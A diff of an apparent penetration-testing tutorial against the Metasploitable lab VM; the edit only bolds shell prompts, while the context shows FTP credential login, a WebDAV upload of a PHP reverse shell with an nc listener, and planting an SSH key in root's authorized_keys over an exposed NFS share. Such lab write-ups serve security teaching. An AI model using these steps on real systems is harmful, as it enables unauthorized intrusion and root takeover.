@@ -892,7 +892,7 @@ Since we now discovered user credentials (user:user), let's try if it is the sam
 
 <pre>
 &nbsp;
-imd@kali:~/Desktop/test/metasp$ ftp 192.168.222.129
+<b>imd@kali:~/Desktop/test/metasp$</b> ftp 192.168.222.129
 Connected to 192.168.222.129.
 220 (vsFTPd 2.3.4)
 Name (192.168.222.129:imd): user
@@ -923,8 +923,8 @@ mget id_dsa? yes
 ftp> exit
 221 Goodbye.
 
-imd@kali:~/Desktop/test/metasp$ chmod 600 id_dsa 
-imd@kali:~/Desktop/test/metasp$ ssh -i id_dsa 192.168.222.129
+<b>imd@kali:~/Desktop/test/metasp$</b> chmod 600 id_dsa 
+<b>imd@kali:~/Desktop/test/metasp$</b> ssh -i id_dsa 192.168.222.129
 load pubkey "id_dsa": invalid format
 sign_and_send_pubkey: no mutual signature supported
 imd@192.168.222.129's password: 
@@ -939,7 +939,7 @@ Our attempt was unsuccessful. The private key should not ask for the password. W
 
 <pre>
 &nbsp;
-imd@kali:~/.ssh$ ssh-keygen -t rsa
+<b>imd@kali:~/.ssh$</b> ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/imd/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -960,10 +960,10 @@ The key's randomart image is:
 |   o * O B..B    |
 |    . = .o=+Eo   |
 +----[SHA256]-----+
-imd@kali:~/.ssh$ ls
+<b>imd@kali:~/.ssh$</b> ls
 authorized_keys.old  id_rsa  id_rsa.old  id_rsa.pub  id_rsa.pub.old  known_hosts
-imd@kali:~/.ssh$ cat id_rsa.pub > authorized_keys
-imd@kali:~/.ssh$ ftp 192.168.222.129
+<b>imd@kali:~/.ssh$</b> cat id_rsa.pub > authorized_keys
+<b>imd@kali:~/.ssh$</b> ftp 192.168.222.129
 Connected to 192.168.222.129.
 220 (vsFTPd 2.3.4)
 Name (192.168.222.129:imd): user
@@ -1024,7 +1024,7 @@ Now go visit the host like how your normally visit a website in a HTTP protocol.
 
 <pre>
 &nbsp;
-imd@kali:/usr/share/webshells$ nikto -h http://192.168.222.129/dav
+<b>imd@kali:/usr/share/webshells$</b> nikto -h http://192.168.222.129/dav
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.222.129
@@ -1075,9 +1075,9 @@ We scanned and confirmed that there is a PUT method that is allowed. This means 
 
 <pre>
 &nbsp;
-imd@kali:/usr/share/webshells/php$ cp php-reverse-shell.php ~/Desktop/test/metasp/rev.php
-imd@kali:/usr/share/webshells/php$ cd ~/Desktop/test/metasp/
-imd@kali:~/Desktop/test/metasp$ subl rev.php 
+<b>imd@kali:/usr/share/webshells/php$</b> cp php-reverse-shell.php ~/Desktop/test/metasp/rev.php
+<b>imd@kali:/usr/share/webshells/php$</b> cd ~/Desktop/test/metasp/
+<b>imd@kali:~/Desktop/test/metasp$</b> subl rev.php 
 
 imd@kali:~/Desktop/test/metasp$ sudo cadaver http://192.168.222.129/dav
 [sudo] password for imd: 
@@ -1098,7 +1098,7 @@ Right after we uploaded the file, let's listen to the port that we configured on
 
 <pre>
 &nbsp;
-imd@kali:~/Desktop/test/metasp$ nc -lvp 1234
+<b>imd@kali:~/Desktop/test/metasp$</b> nc -lvp 1234
 listening on [any] 1234 ...
 192.168.222.129: inverse host lookup failed: Unknown host
 connect to [192.168.222.130] from (UNKNOWN) [192.168.222.129] 55501
@@ -1127,7 +1127,7 @@ How to identify if NFS is enabled on your network or not?
 
 <pre>
 &nbsp;
-imd@kali:~/Desktop/test/metasp$ sudo rpcinfo 192.168.222.129
+<b>imd@kali:~/Desktop/test/metasp$</b> sudo rpcinfo 192.168.222.129
    program version netid     address                service    owner
     100000    2    tcp       0.0.0.0.0.111          portmapper unknown
     100000    2    udp       0.0.0.0.0.111          portmapper unknown
@@ -1166,9 +1166,9 @@ imd@kali:~/Desktop/test/metasp$ sudo showmount -e 192.168.222.129
 Export list for 192.168.222.129:
 / *
 
-imd@kali:~/Desktop/test/metasp$ sudo mount -t nfs 192.168.222.129:/ /tmp/mount
-imd@kali:~/Desktop/test/metasp$ cd /tmp/mount
-imd@kali:/tmp/mount$ ls
+<b>imd@kali:~/Desktop/test/metasp$</b> sudo mount -t nfs 192.168.222.129:/ /tmp/mount
+<b>imd@kali:~/Desktop/test/metasp$</b> cd /tmp/mount
+<b>imd@kali:/tmp/mount$</b> ls
 bin   cdrom  etc   initrd      lib         media  nohup.out  proc  sbin  sys  usr  vmlinuz
 boot  dev    home  initrd.img  lost+found  mnt    opt        root  srv   tmp  var
 
@@ -1183,7 +1183,7 @@ We are interested on .ssh directory. We have an authorized_keys here, so can we 
 
 <pre>
 &nbsp;
-imd@kali:~/.ssh$ ssh-keygen -t rsa
+<b>imd@kali:~/.ssh$</b> ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/imd/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -1215,11 +1215,11 @@ And here is a kali ssh key. What we'll do is to copy the ssh key into the host a
 
 <pre>
 &nbsp;
-imd@kali:/tmp/mount/root/.ssh$ cat /home/imd/.ssh/id_rsa.pub
+<b>imd@kali:/tmp/mount/root/.ssh$</b> cat /home/imd/.ssh/id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKtOjvGX2GTil9mj23vimZ3FxqSVHqNZWTN3+OGDE/qfufiQvnQTYcLnEaL02vJTzXqK605JnmVJtNHuls598ZipM47jgCQ77kpNfT9of8GLQX6NJv0F9jH4EisbuQFvjG82sLHYtlTHy0pNWhyxraXnlBxn3sSWMo/c9kr7YYqFDJLO0lcUOiwEsW3DB+dBYtNV4Nske0oHucCKWUb+lr7YI/6b7CE6m2L1szVLBzDPPO2CSwk6tJDpaehrQBfwd6ZhKx6/jTcjVkXZaW5+4em5Nuf1aku0UMIXTCKrn4hw47eRn7OAxpg7xNHCco3GsUfxrZInvdjpCD85UabCteie8u1NnGhQN2HdMeLdeEGAbzxt9CFkQkslqcvNcZ3hKEenTKLrHjg9rTafvcgtmdb2xcvD+Z8T/80Syesq0SRquqdsWLtoaruQ9Dcwd+u9cAg9qAc2udAhnp2b+yICXEM+DjXXiBXDdZSFkaVts432bUcDnSbI2+d/R3F8Amacc= imd@kali
-imd@kali:/tmp/mount/root/.ssh$ cat authorized_keys 
+<b>imd@kali:/tmp/mount/root/.ssh$</b> cat authorized_keys 
 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
-imd@kali:/tmp/mount/root/.ssh$ subl authorized_keys 
+<b>imd@kali:/tmp/mount/root/.ssh$</b> subl authorized_keys 
 
 </pre>
 </details>
@@ -1231,7 +1231,7 @@ In authorized_keys once we added the public key, go back to kali and just type `
 
 <pre>
 &nbsp;
-imd@kali:~/.ssh$ ssh -i id_rsa root@192.168.222.129
+<b>imd@kali:~/.ssh$</b> ssh -i id_rsa root@192.168.222.129
 Last login: Wed Mar 17 03:23:16 2021 from :0.0
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
 
@@ -1245,7 +1245,7 @@ applicable law.
 To access official Ubuntu documentation, please visit:
 http://help.ubuntu.com/
 You have new mail.
-root@metasploitable:~# 
+<b>root@metasploitable:~#</b> 
 
 </pre>
 </details>
